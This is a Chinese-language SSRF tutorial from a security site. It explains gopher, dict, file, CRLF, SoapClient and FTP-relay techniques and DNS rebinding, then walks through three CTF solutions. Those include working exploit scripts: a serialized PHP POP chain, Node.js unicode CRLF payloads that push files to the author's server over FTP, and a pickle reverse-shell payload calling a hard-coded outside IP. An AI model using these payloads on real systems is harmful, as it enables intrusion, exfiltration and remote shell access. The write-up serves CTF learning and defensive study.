# SSRF漏洞学习

阅读量 **391006**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-05-28 16:30:58

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t012521f2873d481b0d.png)

## SSRF简介

SSRF(Server-Side Request
Forgery:服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

如图是一个简单的SSRF

![](https://p1.ssl.qhimg.com/t01152a2b355e1fca5e.png)

源码如下

    
    
    <?php
    function curl($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_exec($ch);
        curl_close($ch);
    }
    $url = $_GET['url'];
    curl($url);
    

## 利用协议

###  file/local_file

利用file文件可以直接读取本地文件内容，如下

    
    
    file:///etc/passwd
    local_file:///etc/passwd
    

local_file与之类似,常用于绕过

###  dict

dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源。通过使用dict协议可以获取目标服务器端口上运行的服务版本等信息。

如请求

`dict://192.168.163.1:3306/info`

![](https://p5.ssl.qhimg.com/t018f4cdd3dc1c1110a.png)

可以获取目标主机的3306端口上运行着mariadb

###  Gopher

Gopher是基于TCP经典的SSRF跳板协议了，原理如下

    
    
    gopher://127.0.0.1:70/_ + TCP/IP数据(URLENCODE)
    

其中`_`可以是任意字符，作为连接符占位

一个示例

    
    
    GET /?test=123 HTTP/1.1
    Host: 127.0.0.1:2222
    Pragma: no-cache
    Cache-Control: no-cache
    DNT: 1
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Connection: close
    

URL编码后

    
    
    %47%45%54%20%2f%3f%74%65%73%74%3d%31%32%33%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%3a%32%32%32%32%0d%0a%50%72%61%67%6d%61%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%44%4e%54%3a%20%31%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%33%2e%30%2e%34%31%30%33%2e%36%31%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%2c%65%6e%2d%55%53%3b%71%3d%30%2e%38%2c%65%6e%3b%71%3d%30%2e%37%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a
    

测试

    
    
    curl gopher://127.0.0.1:2222/_%47%45%54%20%2f%3f%74%65%73%74%3d%31%32%33%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%3a%32%32%32%32%0d%0a%50%72%61%67%6d%61%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%44%4e%54%3a%20%31%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%33%2e%30%2e%34%31%30%33%2e%36%31%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%2c%65%6e%2d%55%53%3b%71%3d%30%2e%38%2c%65%6e%3b%71%3d%30%2e%37%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a
    
    ->
    HTTP/1.1 200 OK
    Host: 127.0.0.1:2222
    Date: Tue, 26 May 2020 03:53:05 GMT
    Connection: close
    X-Powered-By: PHP/7.3.15-3
    Content-type: text/html; charset=UTF-8
    
    123
    

所以在`SSRF`时利用`gopher`协议我们就可以构造任意TCP数据包发向内网了

## 利用CRLF

在HTTP的TCP包中，HTTP头是以回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)进行分割的。

下图是一个示例：

![](https://p4.ssl.qhimg.com/t01d8db81501398fe9b.png)

如果我们能在输入的url中注入`\r\n`，就可以对`HTTP Headers`进行修改从而控制发出的`HTTP`的报文内容

比如下图

![](https://p5.ssl.qhimg.com/t01bd40f00bf49441e3.png)

`USER anonymous`等就是通过`CRLF`注入插入的伪`HTTP Header`

## PHP中利用Soap Client原生类

SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。

其采用HTTP作为底层通讯协议，XML作为数据传送的格式。

在PHP中该类的构造函数如下：

    
    
    public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
    

第一个参数是用来指明是否是wsdl模式。

第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri
是SOAP服务的目标命名空间。具体可以设置的参数可见官方文档<https://www.php.net/manual/zh/soapclient.construct.php>

其中提供了一个接口

    
    
    The user_agent option specifies string to use in User-Agent header.
    

此处本意是注入`User_Agent` HTTP请求头,但是此处存在CRLF注入漏洞，因此我们在此处可以完全控制HTTP请求头

利用脚本如下

    
    
    <?
    $headers = array(//要注入的header
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'
    );
    $a = new SoapClient(null,array('location' => $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
    

## 利用FTP作为跳板

FTP是基于TCP的在计算机网络上在客户端和服务器之间进行文件传输的应用层协议

![](https://p0.ssl.qhimg.com/t01322a6bc3c21c2d28.png)

通过FTP传输的流量不会被加密，所有传输都是通过明文进行的，这点方便我们对的数据包进行编辑。

![](https://p2.ssl.qhimg.com/t0174529a7106cb1819.png)

FTP协议中命令也是通过`\r\n`分割的 同时FTP会忽略不支持的命令并继续处理下一条命令，所以我们可以直接使用HTTP作为FTP包的载荷

同时通过使用`PORT`命令打开FTP主动模式,可以实现TCP流量代理转发的效果

    
    
    # STEP 1 向FTP服务传TCP包
    TYPE I
    PORT vpsip,0,port
    STOR tcp.bin
    
    # STEP 2 让FTP服务向内网发TCP包
    
    TYPE I
    PORT 172,20,0,5,105,137
    RETR tcp.bin
    

## DNS Rebinding

针对`SSRF`,有一种经典的拦截方式

  1. 获取到输入的URL，从该URL中提取host
  2. 对该host进行DNS解析，获取到解析的IP
  3. 检测该IP是否是合法的，比如是否是私有IP等
  4. 如果IP检测为合法的，则进入curl的阶段发包

第三步对IP进行了检测，避免了内网SSRF

然而不难发现此处对HOST进行了两次解析，一次是在第二步检测IP，第二次是在第四步发包。那么我们很容易有以下绕过思路

控制一个域名`xxx.xxx`，第一次DNS解析，`xxx.xxx`指向正常的ip，防止被拦截

第二次DNS解析，`xxx.xxx`指向127.0.0.1(或其他内网地址)，在第四步中curl向第二次解析得到对应的内网地址发包实现绕过

这个过程已经有了较为完善的利用工具

比如

<https://github.com/nccgroup/singularity>

###  例题

主要分析题目中的SSRF部分

####  MRCTF2020 Ezpop Revenge

目标是访问`/flag.php` 但限制了访问请求的来源ip必须为`127.0.0.1`也就是本地访问

    
    
    <?php
    if(!isset($_SESSION)) session_start();
    if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
       $_SESSION['flag']= "MRCTF{Cr4zy_P0p_4nd_RCE}";
    }else echo "我扌your problem?\nonly localhost can get flag!";
    ?>
    

此题的前半部分在于typecho pop链的构造此处就不过多赘述，直接上Exp

    
    
    <?php
    class HelloWorld_DB{
        private $flag="MRCTF{this_is_a_fake_flag}";
        private $coincidence;
        function __construct($coincidence){
            $this->coincidence = $coincidence;
        }
        function  __wakeup(){
            $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
        }
    }
    class Typecho_Request{
        private $_params;
        private $_filter;
        function __construct($params,$filter){
            $this->_params=$params;
            $this->_filter=$filter;
        }
    }
    class Typecho_Feed{
        private $_type = 'ATOM 1.0';
        private $_charset = 'UTF-8';
        private $_lang = 'zh';
        private $_items = array();
        public function addItem(array $item){
            $this->_items[] = $item;
        }
    }
    
    $target = "http://127.0.0.1/flag.php";
    $post_string = '';
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'
    );
    
    $a = new SoapClient(null,array('location' => $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
    
    $payload1 = new Typecho_Request(array('screenName'=>array($a,"233")),array('call_user_func'));
    $payload2 = new Typecho_Feed();
    $payload2->addItem(array('author' => $payload1));
    $exp1 = array('hello' => $payload2, 'world' => 'typecho');
    $exp = new HelloWorld_DB($exp1);
    echo serialize($exp)."\n";
    echo urlencode(base64_encode(serialize($exp)));
    

其中`$a`为SOAP载荷，`call_user_func()`对SOAP对象进行了主动调用从而触发了请求。

这里关键是使用了PHP的`SoapClient`进行了一个SSRF

    
    
    <?php
    $headers = array(
        'X-Forwarded-For: 127.0.0.1',
        'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'
    );
    $a = new SoapClient(null,array('location' => $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
    

通过`CRLF`注入`PHPSESSION` 然后访问`/flag.php`
php将flag放入`session`中,我们再带着这个`SESSION`去访问对应网页就能获取到存储的flag了

####  MRCTF2021 half nosqli

这个题的前半部分在于Mongodb永真式万能密码绕过，后半部分就是SSRF

首先可以打到自己vps上看看效果

    
    
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    
    url_payload = "http://buptmerak.cn:2333"
    
    
    json = {
        "url":url_payload
    }
    
    req = r.post(url+"home",headers=headers,json=json)
    
    print(req.text)
    

![](https://p3.ssl.qhimg.com/t01b6876a8e5ead7fd1.png)

发现发送了HTTP的请求包

经过尝试该题目中存在Nodejs曾爆出的一个SSRF漏洞，即Unicode拆分攻击，可以进行CRLF注入

利用原理如下

在Node.js尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码。

而当Node.js版本8或更低版本对此URL发出GET请求时，`\u{ff0a}\u{ff0d}`不会进行转义，因为它们不是HTTP控制字符：

但是当结果字符串被默认编码为latin1写入路径时，这些字符将分别被截断为`\x0a\x0d`也即`\r\n` 从而实现了`CRLF`注入

    
    
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    
    url_payload = "http://buptmerak.cn:2333/"
    
    payload ='''
    USER anonymous
    PASS admin888
    CWD files
    TYPE I
    PORT vpsip,0,1890
    RETR flag
    '''.replace("\n","\r\n")
    
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0xff00+ord(i))
        return ret
    #url_payload = url_payload + payload.replace("\n","\uff0d\uff0a")
    
    #url_payload = url_payload + payload.replace(" ","\uff20").replace("\n","\uff0d\uff0a")
    
    url_payload = url_payload + payload_encode(payload)
    
    print(url_payload)
    
    json = {
        "url":url_payload
    }
    
    req = r.post(url+"home",headers=headers,json=json)
    
    print(req.text)
    

可以看到发回的包

![](https://p5.ssl.qhimg.com/t01c51309d5c754f689.png)

已经实现了CRLF的注入，这里的payload也就是我们最终构造的FTP请求包，通过这个请求包，可以使FTP主动向我们的服务器发送上面的文件

![](https://p2.ssl.qhimg.com/t0162c66982936a10f2.png)

USER anonymous 以匿名模式登录  
PASS 随意  
CWD 切换文件夹  
TYPE I 以binary格式传输  
PORT vpsip,0,1890 打开FTP主动模式  
RETR 向对应ip:port 发送文件

在vps上开一个监听端口，就能监听到发来的文件了

    
    
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    
    url_payload = "http://ftp:8899/" #题目附件中docker-compose.yml中泄露的内网主机名
    
    payload ='''
    USER anonymous
    PASS admin888
    CWD files
    TYPE I
    PORT vpsip,0,1890
    RETR flag
    '''.replace("\n","\r\n")
    
    
    
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0xff00+ord(i))
        return ret
    #url_payload = url_payload + payload.replace("\n","\uff0d\uff0a")
    
    #url_payload = url_payload + payload.replace(" ","\uff20").replace("\n","\uff0d\uff0a")
    
    url_payload = url_payload + payload_encode(payload)
    
    print(url_payload)
    
    json = {
        "url":url_payload
    }
    
    req = r.post(url+"home",headers=headers,json=json)
    
    print(req.text)
    

![](https://p3.ssl.qhimg.com/t0161a950e5c96bdb95.png)

####  StarCTF2021 oh-my-bet

题目在获取头像地址处存在ssrf

    
    
    def get_avatar(username):
    
        dirpath = os.path.dirname(__file__)
        user = User.query.filter_by(username=username).first()
    
        avatar = user.avatar
        if re.match('.+:.+', avatar):
            path = avatar
        else:
            path = '/'.join(['file:/', dirpath, 'static', 'img', 'avatar', avatar])
        try:
            content = base64.b64encode(urllib.request.urlopen(path).read())
        except Exception as e:
            error_path = '/'.join(['file:/', dirpath, 'static', 'img', 'avatar', 'error.png'])
            content = base64.b64encode(urllib.request.urlopen(error_path).read())
            print(e)
    
        return content
    
    
    
    import urllib.parse
    import requests
    import re
    import base64
    import time
    
    url = "http://localhost:8088/login"
    
    def read_file(filename):
        name = "eki"+str(time.time())
        avatar = filename
        data = {
            "username":name,
            "password":"322",
            "avatar":avatar,
            "submit":"Go!",
        }
        res = requests.post(url,data=data)
    
        txt = res.text
        find = re.findall("<img src.*>",txt)
    
        if len(find) != 0:
            with open("out",'wb') as f:
                st = base64.b64decode(find[0][32:-47])
                f.write(st)
                if len(st) == 4611:
                    print("{} not exists!".format(filename))
                else:
                    print("Success！->out")
        else:
            print("Error")
            print(res.text)
    
    read_file("file:///app/app.py")
    

并且该版本的`urllib.request.urlopen(path)`存在`CRLF`注入漏洞

分析题目给出的源码，我们能得到最终的解题思路是

向FTP传输恶意流量包并存储->FTP向Mongodb发送恶意流量包插入恶意Session->Session Pickle 反序列化反弹shell

#####  生成恶意mongdb流量包

生成恶意pickle序列化串

    
    
    import pickle
    import base64
    import os
    
    class RCE:
        def __reduce__(self):
            cmd = ("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.70.154.76",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""")
            return os.system, (cmd,)
    
    if __name__ == '__main__':
        pickled = pickle.dumps(RCE())
        print(base64.urlsafe_b64encode(pickled))
        open("exploit.b64", "w").write(base64.urlsafe_b64encode(pickled).decode())
    

生成Mongodb的BSON数据

    
    
    const BSON = require('bson');
    const fs = require('fs');
    
    // Serialize a document
    const doc = {insert: "sessions", $db: "admin", documents: [{
        "id": "session:e51fca6f-1248-450c-8961-b5d1a1aaaaaa",
        "val": Buffer.from(fs.readFileSync("exploit.b64").toString(), "base64"),
        "expiration": new Date("2025-02-17")
    }]};
    const data = BSON.serialize(doc);
    
    let beginning = Buffer.from("5D0000000000000000000000DD0700000000000000", "hex");
    let full = Buffer.concat([beginning, data]);
    
    full.writeUInt32LE(full.length, 0);
    fs.writeFileSync("bson.bin", full);
    

#####  攻击流程

上传到内网FTP服务器

    
    
    payload = '''
    TYPE I
    PORT vpsip,78,32
    STOR bson.bin
    '''
    
    exp = 'http://172.20.0.2:8877/'
    
    exp += urllib.parse.quote(payload.replace('\n', '\r\n'))
    
    read_file(exp)
    

vps打开文件发送

    
    
    import socket
    
    HOST = '0.0.0.0'  
    PORT = 20000        
    blocksize = 4096
    fp = open('bson.bin', 'rb')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        print('start listen...')
        s.listen()
        conn, addr = s.accept()
        with conn:
            while 1:
                buf = fp.read(blocksize)
                if not buf:
                    fp.close()
                    break
                conn.sendall(buf)
        print('end.')
    

内网FTP向Mongodb发送构造恶意数据包

    
    
    payload = '''
    TYPE I
    PORT 172,20,0,5,105,137
    RETR bson.bin
    '''
    
    exp = 'http://172.20.0.2:8877/'
    
    exp += urllib.parse.quote(payload.replace('\n', '\r\n'))
    
    read_file(exp)
    

最终触发

    
    
    import requests
    
    url = "http://localhost:8088/"
    
    cookie = {
        "session":"e51fca6f-1148-450c-8961-b5d1aaaaaaaa"
    }
    
    req = requests.get(url,cookie=cookie)
    

## 参考资料

<https://blog.brycec.me/posts/starctf2021_writeups/#oh-my-bet>

<https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Eki** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/239994](/post/id/239994)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SSRF](/tag/SSRF)
  * [协议安全](/tag/协议安全)

 **+1** __5赞

 __收藏

![](https://p0.ssl.qhimg.com/t012521b8c9e29a374e.png) Eki

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

